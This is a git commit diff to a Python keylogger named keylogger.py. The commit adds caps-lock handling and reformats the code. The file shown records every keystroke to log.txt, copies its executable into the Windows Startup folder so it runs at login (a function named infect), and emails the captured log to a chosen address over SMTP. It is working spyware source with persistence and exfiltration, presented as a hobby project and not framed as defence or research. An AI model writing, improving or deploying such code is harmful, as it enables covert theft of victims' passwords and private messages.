4c2ae6a43e652d8539badc528a9df8bcb7029086
joaquimYuste <yuste321@gmail.com>
2020-11-25 19:19:23 +0100

    Caps enabled

--- Code/python/keylogger.py
+++ Code/python/keylogger.py
@@ -1,28 +1,31 @@
 from pynput import keyboard
 import time, subprocess
 
-f = open('log.txt',"a+")
+f = open('log.txt', "a+")
 
+mayus = False
 
 """
 Generate an executable at the startup's windows folder so the keylogger can be automatically runned
 """
+
+
 def infect():
-	import os
-	from shutil import copy2
-	
-	currentDir = os.getcwd()
-	currentUser = os.getlogin()
+    import os
+    from shutil import copy2
 
-	target = "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" % currentUser
+    currentDir = os.getcwd()
+    currentUser = os.getlogin()
 
-	if(currentDir != target):
-		currentFile = currentDir+"\\keylogger.exe"
-		try:
-			copy2(currentFile,target)
-		except:
-			print("exe not found")
-    
+    target = "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" % currentUser
+
+    if (currentDir != target):
+        currentFile = currentDir + "\\keylogger.exe"
+        try:
+            copy2(currentFile, target)
+        except:
+            print("exe not found")
+
 
 """
 Allows to send log via mail (opening a client session using SMTP protocol). If a gmail account is used, enable access of unsafe applications in your google settings
@@ -31,6 +34,8 @@ Allows to send log via mail (opening a client session using SMTP protocol). If a
 :param sender_password: password of the mail's sender
 :param receiver: mail of the receiver
 """
+
+
 def send_mail(sender, sender_password, reciever):
     import smtplib
     from email.mime.multipart import MIMEMultipart
@@ -49,13 +54,13 @@ def send_mail(sender, sender_password, reciever):
     msg["Subject"] = 'Log of ' + date
     msg["From"] = sender
     msg["To"] = reciever
-    
+
     msg.attach(MIMEText('Download the file', 'plain'))
     attach_file_name = 'log.txt'
     attach_file = open(attach_file_name, 'rb')
     payload = MIMEBase('application', 'octate-stream')
     payload.set_payload((attach_file).read())
-    encoders.encode_base64(payload) #encode the attachment
+    encoders.encode_base64(payload)  # encode the attachment
 
     payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
     msg.attach(payload)
@@ -67,29 +72,42 @@ def send_mail(sender, sender_password, reciever):
     s.sendmail(sender, reciever, msg.as_string())
     s.quit()
 
+
 """
 Very simple handler of the keyboard listener
 
 :param key: key pressed
 """
+
+
 def on_press(key):
+    global mayus, f
+
     if key == keyboard.Key.esc:
         return False  # stop listener
     try:
         k = key.char  # single-char keys
+        print(mayus)
+        if (mayus):
+            k = k.upper()
         f.write(k)
         print('Key pressed: ' + k)
     except:
         try:
             k = key.name  # other keys
-            if(k=="space"):
+
+            if (k == "caps_lock"):
+                mayus = not mayus
+                print(mayus)
+            if (k == "space"):
                 f.write(" ")
-            elif(k=="enter"):
+            elif (k == "enter"):
                 f.write("\n")
-			else:
-				f.write(k)
+            else:
+                m = "[" + k + "]"
+                f.write(m)
             print('Key pressed: ' + k)
-        except AttributeError: # if a key has no name, raises an error
+        except AttributeError:  # if a key has no name, raises an error
             f.write("[missing]")
 
 
